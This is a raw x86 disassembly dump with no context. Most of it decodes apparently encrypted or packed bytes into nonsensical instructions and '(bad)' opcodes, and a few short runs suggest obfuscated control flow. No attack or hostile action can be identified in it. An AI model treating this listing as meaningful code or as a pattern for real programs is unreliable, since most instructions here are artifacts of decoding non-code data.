  40d04c:	add    edx,0x5c1930e
  40d052:	xchg   DWORD PTR [ebp-0x76f67b0f],edi
  40d058:	push   ds
  40d059:	and    al,0x64
  40d05b:	ss popa 
  40d05d:	mov    esp,0x422cb2fc
  40d062:	xchg   ebp,eax
  40d063:	sub    eax,0x9196f616
  40d068:	or     BYTE PTR [esi-0x31bac0d3],0x8c
  40d06f:	les    edx,FWORD PTR [esi+0x37]
  40d072:	jnp    0x40d0d2
  40d074:	push   esi
  40d075:	mov    dh,0x8a
  40d077:	mov    ah,0x34
  40d079:	repnz pop edi
  40d07b:	jnp    0x40d057
  40d07d:	gs (bad) 
  40d07f:	jns    0x40d005
  40d081:	rcl    DWORD PTR [edx-0x13],cl
  40d084:	xchg   ebx,eax
  40d085:	ja     0x40d0e4
  40d087:	jns    0x40d017
  40d089:	mov    WORD PTR [ecx],?
  40d08b:	fadd   QWORD PTR [edi+0x17]
  40d08e:	mov    al,0xf6
  40d090:	inc    ecx
  40d091:	iret   
  40d092:	das    
  40d093:	adc    bh,BYTE PTR [edi]
  40d095:	stc    
  40d096:	arpl   WORD PTR [esp+edi*1+0x41],cx
  40d09a:	pop    ebp
  40d09b:	call   0x650d:0x1e1793c2
  40d0a2:	popa   
  40d0a3:	call   0xb93607bc
  40d0a8:	adc    esp,DWORD PTR [eax]
  40d0aa:	jns    0x40d078
  40d0ac:	lds    ebp,FWORD PTR [esi-0x4dcd5ec6]
  40d0b2:	gs (bad) 
  40d0b4:	push   ebx
  40d0b5:	inc    edx
  40d0b6:	rcl    BYTE PTR [edi],1
  40d0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0b9:	rcl    DWORD PTR [edx],cl
  40d0bb:	jg     0x40d13a
  40d0bd:	push   ss
  40d0be:	sahf   
  40d0bf:	push   ebp
  40d0c0:	mov    ch,0x53
  40d0c2:	pop    ecx
  40d0c3:	out    0x27,al
  40d0c5:	pop    esi
  40d0c6:	push   0x39
  40d0c8:	xchg   ecx,eax
  40d0c9:	pop    ebx
  40d0ca:	cmp    edi,esp
  40d0cc:	sbb    eax,DWORD PTR [ecx+0x52]
  40d0cf:	jmp    0x40d121
  40d0d1:	add    DWORD PTR [edx+0xd],ebx
  40d0d4:	mov    ds:0x69606ca1,al
  40d0d9:	jae    0x40d0f9
  40d0db:	ficom  DWORD PTR [ebp+0x4e]
  40d0de:	jnp    0x40d15c
  40d0e0:	scas   al,BYTE PTR es:[edi]
  40d0e1:	add    DWORD PTR [edx+ecx*4],eax
  40d0e4:	fisubr WORD PTR [eax+0x70]
  40d0e7:	and    ebp,DWORD PTR [ecx+edx*1]
  40d0ea:	ficomp WORD PTR [edi]
  40d0ec:	inc    esi
  40d0ed:	sub    DWORD PTR [edx+0x5a],ebp
  40d0f0:	adc    bl,BYTE PTR [edi-0x1d8ac151]
  40d0f6:	rol    BYTE PTR cs:[eax+0x7dd45ace],cl
  40d0fd:	dec    ebp
  40d0fe:	je     0x40d0b4
  40d100:	paddusb mm4,QWORD PTR [edi-0x307f1852]
  40d107:	leave  
  40d108:	fbstp  TBYTE PTR [edx-0x6574f8f2]
  40d10e:	leave  
  40d10f:	sub    al,cl
  40d111:	call   0x18303b11
  40d116:	xor    ch,BYTE PTR [ebx+0x5432683e]
  40d11c:	jmp    0x5e355023
  40d121:	lods   al,BYTE PTR fs:[esi]
  40d123:	xor    bh,BYTE PTR [ebx-0x2779adb3]
  40d129:	dec    ebp
  40d12a:	jle    0x40d0d1
  40d12c:	retf   0x47ee
  40d12f:	lods   eax,DWORD PTR ds:[esi]
  40d130:	cmc    
  40d131:	mov    ds:0x39bc9ed2,al
  40d136:	sbb    al,0x19
  40d138:	call   0x65c4bc0a
  40d13d:	adc    eax,0x2f84e759
  40d142:	pop    esp
  40d143:	jns    0x40d1bb
  40d145:	mov    bl,0x56
  40d147:	pop    edx
  40d148:	fs ja  0x40d13d
  40d14b:	pop    esp
  40d14c:	jle    0x40d0ef
  40d14e:	jp     0x40d0d9
  40d150:	mov    ds:0xd7a09937,eax
  40d155:	lods   eax,DWORD PTR ds:[esi]
  40d156:	add    eax,DWORD PTR [edi+0x4f]
  40d159:	cmp    al,bh
  40d15b:	fwait
  40d15c:	mov    es,edi
  40d15e:	add    eax,DWORD PTR [ebx+0x480819a3]
  40d164:	pop    ss
  40d165:	int3   
  40d166:	xchg   edi,eax
  40d167:	in     eax,dx
  40d168:	mov    esp,0x1fe00bce
  40d16d:	addr16 in eax,dx
  40d16f:	shl    DWORD PTR [bp+si],cl
  40d172:	mov    al,0xeb
  40d174:	in     al,0x24
  40d176:	and    eax,0x6cdc3128
  40d17b:	cmc    
  40d17c:	mov    dh,0xac
  40d17e:	push   ebx
  40d17f:	or     DWORD PTR ds:0x6a44cdff,ecx
  40d185:	dec    ebx
  40d186:	fisttp WORD PTR [eax+0xb7f71c9]
  40d18c:	aam    0x54
  40d18e:	add    BYTE PTR [eax+0x46],ah
  40d191:	mov    dh,0x18
  40d193:	sub    al,0x3
  40d195:	lea    esi,[eax-0x46]
  40d198:	leave  
  40d199:	mov    cl,0xc3
  40d19b:	pop    esi
  40d19c:	test   BYTE PTR [ecx+0x47d11ab5],dl
  40d1a2:	lea    ebp,[edx]
  40d1a4:	sub    eax,0x77cb592f
  40d1a9:	xor    DWORD PTR [edi-0x77],esp
  40d1ac:	xor    esp,DWORD PTR [esi-0x2c3f0186]
  40d1b2:	retf   
  40d1b3:	pop    esp
  40d1b4:	lods   eax,DWORD PTR ds:[esi]
  40d1b5:	mov    ds:0x35df3380,al
  40d1ba:	mov    bl,0xe7
  40d1bc:	lods   al,BYTE PTR ds:[esi]
  40d1bd:	mov    ebx,0x6ab46210
  40d1c2:	imul   eax,DWORD PTR [ebp-0x43b3df96],0xa8ba5ddb
  40d1cc:	xor    cl,ah
  40d1ce:	repz (bad) 
  40d1d0:	(bad)  
  40d1d1:	jmp    0x63d5:0xdd76b9c7
  40d1d8:	jne    0x40d1a1
  40d1da:	and    eax,0x828a9a67
  40d1df:	xor    edx,eax
  40d1e1:	add    edx,ecx
  40d1e3:	imul   edx,edi
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	cmc    
  40d20f:	ror    BYTE PTR [ebx+0x7e9ac609],1
  40d215:	jle    0x40d287
  40d217:	jns    0x40d297
  40d219:	jle    0x40d291
  40d21b:	test   DWORD PTR [edx+0x17b39029],esi
  40d221:	jmp    0xb1de:0x292e8434
  40d228:	dec    esi
  40d229:	and    eax,0x2691fc66
  40d22e:	(bad)  
  40d22f:	jbe    0x40d28d
  40d231:	mov    esp,0x3487d88d
  40d236:	aaa    
  40d237:	pop    esp
  40d238:	sahf   
  40d239:	(bad)  [eax-0x2c762866]
  40d23f:	lods   eax,DWORD PTR ds:[esi]
  40d240:	idiv   cl
  40d242:	mov    ds:0x4be0f4a0,al
  40d247:	retf   0x7ee4
  40d24a:	sub    cl,bl
  40d24c:	lock adc ebp,edi
  40d24f:	dec    edi
  40d250:	clc    
  40d251:	dec    esi
  40d252:	jmp    0x40d23a
  40d254:	jmp    0x40d2b6
  40d256:	pop    eax
  40d257:	int3   
  40d258:	fld    QWORD PTR [edi+0x1b0be43f]
  40d25e:	bound  esi,QWORD PTR [edx-0x64]
  40d261:	test   eax,0xaeefdbe9
  40d266:	pusha  
  40d267:	jg     0x40d248
  40d269:	inc    esi
  40d26a:	fbld   TBYTE PTR [eax-0x105846e9]
  40d270:	data16 loope 0x40d200
  40d273:	(bad)  [edi+0x2f]
  40d276:	enter  0x1a74,0x89
  40d27a:	inc    edi
  40d27b:	jg     0x40d2e0
  40d27d:	sub    al,BYTE PTR [edi-0x2d887b2f]
  40d283:	out    0x2d,eax
  40d285:	test   al,0x3f
  40d287:	xor    edi,DWORD PTR [ebp+0x67]
  40d28a:	mov    edx,0x3e94dd87
  40d28f:	sub    BYTE PTR [esi+0x3e],ah
  40d292:	dec    edi
  40d293:	push   ds
  40d294:	jmp    0x40d219
  40d296:	dec    edx
  40d297:	test   eax,0xf7e32c1f
  40d29c:	xchg   edi,eax
  40d29d:	push   ds
  40d29e:	ja     0x40d23f
  40d2a0:	add    al,0xe5
  40d2a2:	dec    ecx
  40d2a3:	and    BYTE PTR [esi],bh
  40d2a5:	push   esp
  40d2a6:	pop    ss
  40d2a7:	push   edi
  40d2a8:	and    esp,ebp
  40d2aa:	and    BYTE PTR [eax],ch
  40d2ac:	add    al,0x2a
  40d2ae:	retf   
  40d2af:	les    esi,FWORD PTR [edx+0x577f4565]
  40d2b5:	fdivr  DWORD PTR [edi-0x7c]
  40d2b8:	enter  0xf91f,0xc4
  40d2bc:	mov    cx,0xb8dc
  40d2c0:	cmovb  ebx,DWORD PTR [ebx+eax*4+0xc]
  40d2c5:	out    dx,eax
  40d2c6:	test   al,0x4f
  40d2c8:	mov    ah,0xc5
  40d2ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2cb:	dec    ebp
  40d2cc:	and    BYTE PTR [esi],cl
  40d2ce:	(bad)  
  40d2cf:	xlat   BYTE PTR ds:[ebx]
  40d2d0:	and    al,0xf0
  40d2d2:	add    DWORD PTR [esi-0x5175e80a],ecx
  40d2d8:	imul   ebp,DWORD PTR [ecx+0x54],0x57a63ccd
  40d2df:	fdiv   DWORD PTR gs:[ebp-0x7e]
  40d2e3:	(bad)  [ebp-0x29]
  40d2e6:	popa   
  40d2e7:	test   eax,0xaaa274a5
  40d2ec:	mov    al,0x56
  40d2ee:	xor    eax,0x470ab6fd
  40d2f3:	aad    0x9c
  40d2f5:	mov    eax,0x9ab280c1
  40d2fa:	jmp    0x7f35f468
  40d2ff:	pop    ebx
  40d300:	adc    DWORD PTR ds:0x977f6d5e,eax
  40d306:	mov    dh,0xc9
  40d308:	adc    DWORD PTR [esi-0x4b3bb76a],ecx
  40d30e:	scas   eax,DWORD PTR es:[edi]
  40d30f:	aas    
  40d310:	pop    ecx
  40d311:	mov    ds:0x398ba463,eax
  40d316:	ret    0x3379
  40d319:	(bad)  
  40d31a:	fidivr WORD PTR [eax+edi*8+0x470389e8]
  40d321:	xchg   ebp,eax
  40d322:	lahf   
  40d323:	push   esp
  40d324:	js     0x40d346
  40d326:	sbb    bh,bh
  40d328:	jp     0x40d2bb
  40d32a:	int    0x2a
  40d32c:	xor    DWORD PTR cs:[edi],edi
  40d32f:	out    0x6c,eax
  40d331:	cmp    eax,0xa68876af
  40d336:	out    0xb,eax
  40d338:	cmc    
  40d339:	inc    ebx
  40d33a:	lahf   
  40d33b:	jne    0x40d380
  40d33d:	mov    gs,WORD PTR [ecx+0x6d]
  40d340:	out    0xaa,eax
  40d342:	dec    edi
  40d343:	sub    eax,0xb51ce746
  40d348:	ficomp WORD PTR [esi-0x52]
  40d34b:	imul   BYTE PTR ds:0xefef8135
  40d351:	xchg   DWORD PTR [ecx+edx*1],ebp
  40d354:	popf   
  40d355:	sub    al,0x36
  40d357:	fstp   DWORD PTR [esi]
  40d359:	jl     0x40d352
  40d35b:	aad    0x28
  40d35d:	(bad)  
  40d35f:	mov    ch,0xf
  40d361:	xchg   ecx,eax
  40d362:	lods   eax,DWORD PTR ds:[esi]
  40d363:	addr16 push 0xffffff9e
  40d366:	loope  0x40d3d4
  40d368:	nop
  40d369:	fcmove st,st(2)
  40d36b:	aas    
  40d36c:	adc    DWORD PTR [ecx+0x43c1495],esp
  40d372:	out    0x88,eax
  40d374:	mov    ds:0x48f4b471,eax
  40d379:	fld    DWORD PTR [edx]
  40d37b:	aas    
  40d37c:	fcmovnb st,st(2)
  40d37e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d37f:	pop    es
  40d380:	popa   
  40d381:	adc    esp,DWORD PTR [ebp+0x38ed91e9]
  40d387:	pop    ss
  40d388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d389:	pop    ebp
  40d38a:	ret    0x7e59
  40d38d:	iret   
  40d38e:	faddp  st(2),st
  40d390:	add    ch,BYTE PTR [ebx]
  40d392:	(bad)  
  40d393:	mov    ds:0x92776944,al
  40d398:	ins    DWORD PTR es:[edi],dx
  40d399:	in     al,dx
  40d39a:	xchg   edi,eax
  40d39b:	fwait
  40d39c:	cdq    
  40d39d:	cmp    ebp,DWORD PTR [eax+0x24005a1f]
  40d3a3:	mov    eax,0x35364baa
  40d3a8:	push   es
  40d3a9:	(bad)  
  40d3aa:	fild   WORD PTR [ebx]
  40d3ac:	int3   
  40d3ad:	mov    eax,0x969b8e49
  40d3b2:	test   DWORD PTR [ecx-0x3610d5b9],ebx
  40d3b8:	in     al,0xad
  40d3ba:	ror    BYTE PTR [ebx-0x1efa93e6],cl
  40d3c0:	pop    es
  40d3c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3c2:	out    dx,al
  40d3c3:	mov    dh,0xe2
  40d3c5:	and    edi,DWORD PTR [edi+0x1df8c0d3]
  40d3cb:	mov    bl,0xd3
  40d3cd:	mov    ebx,0xec753f4e
  40d3d2:	cli    
  40d3d3:	lock leave 
  40d3d5:	sub    bl,bl
  40d3d7:	loope  0x40d37e
  40d3d9:	add    eax,0x90d0fb71
  40d3de:	out    0xfb,al
  40d3e0:	fldenv [esp+esi*4-0x1a2711b5]
  40d3e7:	ds out dx,al
  40d3e9:	aad    0xd0
  40d3eb:	jg     0x40d403
  40d3ed:	dec    ebp
  40d3ee:	mov    edi,0x353cab42
  40d3f3:	jl     0x40d3dd
  40d3f5:	mov    eax,ds:0x820d9371
  40d3fa:	jnp    0x40d3d9
  40d3fc:	fstp   QWORD PTR [ebp+0x1f5d45e0]
  40d403:	mov    al,0x59
  40d405:	cld    
  40d406:	push   eax
  40d407:	push   esi
  40d408:	fild   QWORD PTR [edi]
  40d40a:	cmp    al,0x2d
  40d40c:	sub    edi,DWORD PTR [ebp+0x60]
  40d40f:	push   0xe96c25bd
  40d414:	xchg   edx,eax
  40d415:	iret   
  40d416:	add    al,BYTE PTR [edx-0x78]
  40d419:	mov    BYTE PTR [esi],0x46
  40d41c:	dec    ecx
  40d41d:	je     0x40d498
  40d41f:	imul   edi,DWORD PTR [ebx+0x2c],0x94642c73
  40d426:	adc    ebp,ecx
  40d428:	(bad)  
  40d429:	jo     0x40d3e6
  40d42b:	sub    eax,0xac3ffef
  40d430:	imul   DWORD PTR [ecx]
  40d432:	pop    edx
  40d433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d434:	call   0xe44:0x19a38925
  40d43b:	add    ebp,ecx
  40d43d:	adc    esi,0xffffffc4
  40d440:	cmp    eax,0xd3e2b654
  40d445:	rcl    DWORD PTR [eax+0x14cf917c],1
  40d44b:	mov    ds:0x94dfe0a5,eax
  40d450:	cld    
  40d451:	mov    ds:0xa57a7b21,eax
  40d456:	mov    dh,0x6b
  40d458:	test   BYTE PTR [eax+0x36],dh
  40d45b:	push   ds
  40d45c:	stc    
  40d45d:	sub    al,0x41
  40d45f:	add    al,0x1a
  40d461:	pop    ss
  40d462:	aaa    
  40d463:	jno    0x40d3f9
  40d465:	mov    ah,BYTE PTR [edx-0x68]
  40d468:	pop    eax
  40d469:	inc    eax
  40d46a:	mov    bl,0xda
  40d46c:	pop    ebx
  40d46d:	and    BYTE PTR [ebp-0x4e],bh
  40d470:	xchg   esp,eax
  40d471:	add    DWORD PTR [eax],eax
  40d473:	inc    ebx
  40d474:	cmp    DWORD PTR [eax-0x16134d26],ebp
  40d47a:	and    DWORD PTR [eax-0x25],0x78ac4906
  40d481:	jp     0x40d467
  40d483:	stc    
  40d484:	or     BYTE PTR [edi+0x25],dh
  40d487:	lahf   
  40d488:	je     0x40d468
  40d48a:	mov    edi,0xf5ca48b6
  40d48f:	add    al,0xb7
  40d491:	rol    DWORD PTR [esi],0x21
  40d494:	xor    DWORD PTR [ecx-0xf],eax
  40d497:	mov    edi,0x79b3e9f7
  40d49c:	bswap  ebx
  40d49e:	rcl    ebp,0xe6
  40d4a1:	mov    al,BYTE PTR [eax-0x3561d189]
  40d4a7:	jmp    0x6b0b:0x8777594f
  40d4ae:	mov    esp,0x4c5b7da0
  40d4b3:	sub    al,0x43
  40d4b5:	addr16 cs in eax,dx
  40d4b8:	int    0xf2
  40d4ba:	push   ss
  40d4bb:	and    al,0xf7
  40d4bd:	or     edx,ebx
  40d4bf:	nop
  40d4c0:	out    0x30,eax
  40d4c2:	pop    edx
  40d4c3:	sbb    dl,bh
  40d4c5:	in     eax,dx
  40d4c6:	mov    WORD PTR gs:[esi],es
  40d4c9:	retf   
  40d4ca:	daa    
  40d4cb:	leave  
  40d4cc:	or     eax,0x80dd7050
  40d4d1:	outs   dx,BYTE PTR ds:[esi]
  40d4d2:	or     BYTE PTR [eax],0x83
  40d4d5:	jg     0x40d465
  40d4d7:	or     al,0xc4
  40d4d9:	arpl   WORD PTR [ebx+0x1749a047],bp
  40d4df:	rol    BYTE PTR [ebx+0x42],0x61
  40d4e3:	out    dx,eax
  40d4e4:	mov    edi,0x22cb52b9
  40d4e9:	cmp    al,0x0
  40d4eb:	cs inc edi
  40d4ed:	mov    eax,0x5ffac1
  40d4f2:	je     0x40d4fc
  40d4f4:	adc    DWORD PTR [edi-0x6],0xba8b6bbb
  40d4fb:	push   ebx
  40d4fc:	jne    0x40d532
  40d4fe:	mov    ch,0x77
  40d500:	fstp   QWORD PTR [eax-0x3fc0d01]
  40d506:	in     eax,dx
  40d507:	xchg   esp,eax
  40d508:	clc    
  40d509:	dec    edi
  40d50a:	test   BYTE PTR [eax+0x16],al
  40d50d:	mov    eax,ds:0x1ce9c923
  40d512:	std    
  40d513:	xor    al,0xe
  40d516:	dec    esi
  40d517:	push   edi
  40d518:	(bad)  [eax]
  40d51a:	cmp    eax,0xe71a80c1
  40d51f:	sbb    esi,esi
  40d521:	adc    bh,ch
  40d523:	jg     0x40d55b
  40d525:	or     BYTE PTR ds:0x66d10025,al
  40d52b:	sub    edx,DWORD PTR ds:0x33cfa484
  40d531:	xchg   ecx,eax
  40d532:	cmp    al,0x1f
  40d534:	xchg   esp,eax
  40d535:	test   DWORD PTR [ebx-0x2895066f],ebp
  40d53b:	mov    ebp,0xeacdbdd3
  40d540:	out    dx,eax
  40d541:	mov    edx,0xcdee5e1d
  40d546:	cli    
  40d547:	ret    0x9c8a
  40d54a:	mov    cl,0xea
  40d54c:	test   eax,0x983d995f
  40d551:	xchg   edi,eax
  40d552:	pop    es
  40d553:	stos   BYTE PTR es:[edi],al
  40d554:	aad    0xc5
  40d556:	in     eax,0x77
  40d558:	fidiv  WORD PTR fs:[esi+ecx*8+0x5c221724]
  40d560:	cmp    edi,DWORD PTR [esi-0x61e4406]
  40d566:	jmp    0x40d5a8
  40d568:	adc    ebx,DWORD PTR [ecx+0xc]
  40d56b:	je     0x40d54e
  40d56d:	in     eax,0x40
  40d56f:	jmp    DWORD PTR [ebp-0x27]
  40d572:	int    0x2f
  40d574:	pop    eax
  40d575:	(bad)  
  40d576:	xlat   BYTE PTR ds:[ebx]
  40d577:	js     0x40d5d2
  40d579:	add    esi,DWORD PTR [edi+edi*4-0x42]
  40d57d:	mov    DWORD PTR [edx+0x47b51301],edx
  40d583:	cwde   
  40d584:	gs stos DWORD PTR es:[edi],eax
  40d586:	fsubr  QWORD PTR [eax+0x4026a1e4]
  40d58c:	adc    edi,DWORD PTR [eax+ecx*4+0x39]
  40d590:	in     al,dx
  40d591:	cmc    
  40d592:	dec    esi
  40d593:	ss pop eax
  40d595:	in     eax,0x91
  40d597:	(bad)  
  40d598:	jge    0x40d5a4
  40d59a:	das    
  40d59b:	mov    ecx,0x48075415
  40d5a0:	loope  0x40d58f
  40d5a2:	add    bl,BYTE PTR [edx+eiz*2]
  40d5a5:	(bad)  
  40d5a6:	push   esi
  40d5a7:	unpckhps xmm2,xmm3
  40d5aa:	xchg   ebx,eax
  40d5ab:	shl    BYTE PTR [edi-0x773750d7],cl
  40d5b1:	pop    eax
  40d5b2:	adc    al,0x5c
  40d5b4:	xor    eax,0x9f7571bd
  40d5b9:	sub    al,0x49
  40d5bb:	fild   DWORD PTR [edx+0x79]
  40d5be:	sub    dl,BYTE PTR [esi-0x3b]
  40d5c1:	dec    esi
  40d5c2:	gs ja  0x40d5ad
  40d5c5:	fiadd  DWORD PTR [eax]
  40d5c7:	outs   dx,DWORD PTR ds:[esi]
  40d5c8:	(bad)  
  40d5c9:	shr    DWORD PTR [edi],cl
  40d5cb:	cdq    
  40d5cc:	clc    
  40d5cd:	fiadd  WORD PTR [ebp+0x6]
  40d5d0:	(bad)  
  40d5d1:	rcl    ah,1
  40d5d3:	pop    eax
  40d5d4:	popa   
  40d5d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5d6:	adc    esi,ebx
  40d5d8:	fwait
  40d5d9:	outs   dx,DWORD PTR ds:[esi]
  40d5da:	mov    ebp,ds
  40d5dc:	das    
  40d5dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5de:	(bad)  
  40d5df:	fsubr  QWORD PTR [edx+0x788c0c37]
  40d5e5:	jns    0x40d578
  40d5e7:	leave  
  40d5e8:	dec    eax
  40d5e9:	sbb    cl,BYTE PTR [esi+edx*4-0x5b]
  40d5ed:	dec    eax
  40d5ee:	adc    DWORD PTR [ebp+0x56],esp
  40d5f1:	push   esp
  40d5f2:	sbb    eax,0xd249ed59
  40d5f7:	lahf   
  40d5f8:	inc    edx
  40d5f9:	gs cs jnp 0x40d679
  40d5fd:	push   ss
  40d5fe:	ja     0x40d67e
  40d600:	or     BYTE PTR [edi+0x4c254765],bh
  40d606:	lods   al,BYTE PTR ds:[esi]
  40d607:	repz and al,0x1b
  40d60a:	xor    al,0x42
  40d60c:	pushf  
  40d60d:	add    al,0x99
  40d60f:	es loop 0x40d5a4
  40d612:	scas   eax,DWORD PTR es:[edi]
  40d613:	mov    DWORD PTR [ebx],esi
  40d615:	fsubr  DWORD PTR [ebx]
  40d617:	ror    DWORD PTR [ebp+0x72991fbc],1
  40d61d:	xor    al,BYTE PTR [eax]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x589e7f98
  40d64b:	mov    dh,0x38
  40d64d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d64e:	jle    0x40d6ce
  40d650:	jo     0x40d6cb
  40d652:	jle    0x40d6d2
  40d654:	mov    esi,0xcd6fd840
  40d659:	jp     0x40d671
  40d65b:	xor    eax,0xd982206d
  40d660:	mov    bh,0xdf
  40d662:	sub    DWORD PTR [esp+ebx*1+0x7bb8a12],esp
  40d669:	daa    
  40d66a:	push   ds
  40d66b:	ret    0x6c24
  40d66e:	adc    DWORD PTR [ebp+0x2c006131],edi
  40d674:	jle    0x40d6aa
  40d676:	test   DWORD PTR [esi],0x1065e219
  40d67c:	jmp    0x40d6a7
  40d67e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d67f:	test   BYTE PTR [edi],bh
  40d681:	out    0x54,eax
  40d683:	ret    0x53d8
  40d686:	and    dh,BYTE PTR [ebx]
  40d688:	fstp   QWORD PTR [edi+0x43]
  40d68b:	pusha  
  40d68c:	jmp    0xfac3:0x80c19e60
  40d693:	xor    DWORD PTR [edx],edi
  40d695:	pop    ecx
  40d696:	cmp    ah,ch
  40d698:	cmp    edi,esi
  40d69a:	xor    BYTE PTR [ebx-0x769e40b],ch
  40d6a0:	shl    BYTE PTR es:[edx-0xe],0xae
  40d6a5:	call   0xae959883
  40d6aa:	inc    edx
  40d6ab:	fnstcw WORD PTR [edi]
  40d6ad:	data16 loope 0x40d706
  40d6b0:	jb     0x40d689
  40d6b2:	daa    
  40d6b3:	call   0x341e00e5
  40d6b8:	push   es
  40d6b9:	adc    dh,bl
  40d6bb:	mov    cl,0xe4
  40d6bd:	push   ebp
  40d6be:	out    0xfb,al
  40d6c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6c1:	pushf  
  40d6c2:	push   cs
  40d6c3:	push   0xe
  40d6c5:	or     ebx,esp
  40d6c7:	jl     0x40d66e
  40d6c9:	aas    
  40d6ca:	js     0x40d667
  40d6cc:	adc    esi,edx
  40d6ce:	mov    bl,0x76
  40d6d0:	popa   
  40d6d1:	adc    eax,0x526e489f
  40d6d6:	inc    esp
  40d6d7:	adc    dl,cl
  40d6d9:	mov    edx,0xb5457448
  40d6de:	lds    ecx,FWORD PTR [ebx-0x3618ccfb]
  40d6e4:	shr    dh,1
  40d6e6:	or     al,0xe3
  40d6e8:	or     eax,DWORD PTR [edi-0x1020d178]
  40d6ee:	sub    eax,0xd7e115ef
  40d6f3:	mov    bl,0x10
  40d6f5:	add    BYTE PTR [edi-0x41],dh
  40d6f8:	xchg   edx,eax
  40d6f9:	imul   esi,DWORD PTR [ebx+0x12],0x707c5308
  40d700:	push   ebx
  40d701:	dec    esp
  40d702:	test   BYTE PTR [edi+0x494c3079],0x20
  40d709:	pop    es
  40d70a:	inc    edx
  40d70b:	xor    al,0x12
  40d70d:	dec    ebp
  40d70e:	cmp    bh,BYTE PTR [edi+0x51]
  40d711:	hlt    
  40d712:	push   ebx
  40d713:	mov    ds:0x896c7b14,al
  40d718:	shr    dl,cl
  40d71a:	outs   dx,DWORD PTR ds:[esi]
  40d71b:	pop    es
  40d71c:	xchg   ebp,eax
  40d71d:	lahf   
  40d71e:	push   cs
  40d71f:	pop    eax
  40d720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d721:	js     0x40d6d4
  40d723:	sar    DWORD PTR [eax],1
  40d725:	dec    ebx
  40d726:	lahf   
  40d727:	jmp    0x40d6c9
  40d729:	outs   dx,BYTE PTR ds:[esi]
  40d72a:	scas   eax,DWORD PTR es:[edi]
  40d72b:	into   
  40d72c:	outs   dx,BYTE PTR ds:[esi]
  40d72d:	repz or BYTE PTR ds:0x5977e0a9,dl
  40d734:	push   esp
  40d735:	sub    eax,0x3523d14f
  40d73a:	scas   eax,DWORD PTR es:[edi]
  40d73b:	lock mov ebp,0x6f274d23
  40d741:	mov    bl,0x7b
  40d743:	xchg   esi,eax
  40d744:	(bad)  
  40d745:	jmp    FWORD PTR [ebp+0x73973d3b]
  40d74b:	aaa    
  40d74c:	push   ds
  40d74d:	(bad)  
  40d74e:	cld    
  40d74f:	jno    0x40d744
  40d751:	outs   dx,BYTE PTR ds:[esi]
  40d752:	xor    bl,BYTE PTR ds:0xb2d35c5f
  40d758:	push   ds
  40d759:	push   esi
  40d75a:	inc    ebx
  40d75b:	adc    BYTE PTR ds:0xd12aef41,ch
  40d761:	jmp    0x40d740
  40d763:	js     0x40d7bf
  40d765:	mov    WORD PTR ds:0x84ae8090,ds
  40d76b:	test   DWORD PTR [ecx+0x1f4778a6],ebp
  40d771:	(bad)  
  40d772:	ds mov esp,0xb3766403
  40d778:	push   edx
  40d779:	jb     0x40d760
  40d77b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d77c:	or     DWORD PTR [ecx-0x60],ebx
  40d77f:	fstp   TBYTE PTR [ebx+0x13]
  40d782:	mov    edi,0xdfc7fbd1
  40d787:	mov    dh,0x1c
  40d789:	ja     0x40d72d
  40d78b:	mov    cl,0xbd
  40d78d:	adc    DWORD PTR [eax-0x7945ae4f],esp
  40d793:	pop    edx
  40d794:	and    dl,BYTE PTR [esi+eiz*4+0x52]
  40d798:	or     eax,0x310540e
  40d79d:	xchg   ebx,eax
  40d79e:	imul   ebx,DWORD PTR [edi+0x23],0x9bb311c7
  40d7a5:	fcomp  QWORD PTR [edi-0x55]
  40d7a8:	jecxz  0x40d7ff
  40d7aa:	sahf   
  40d7ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7ac:	sahf   
  40d7ad:	add    DWORD PTR [ebp-0x6ca834f0],ecx
  40d7b3:	stc    
  40d7b4:	pop    ss
  40d7b5:	ds sub al,0x6b
  40d7b8:	popf   
  40d7b9:	push   ebx
  40d7ba:	adc    dl,ch
  40d7bc:	push   edi
  40d7bd:	lahf   
  40d7be:	xchg   BYTE PTR [edx-0x5c186f0c],bl
  40d7c4:	iret   
  40d7c5:	bound  esp,QWORD PTR [ecx]
  40d7c7:	push   edi
  40d7c8:	mov    bl,0xdb
  40d7ca:	pop    ds
  40d7cb:	int    0x1c
  40d7cd:	std    
  40d7ce:	adc    DWORD PTR [ebx+0x6fe89884],esi
  40d7d4:	outs   dx,BYTE PTR ds:[esi]
  40d7d5:	das    
  40d7d6:	test   BYTE PTR [edx-0x3f],0x96
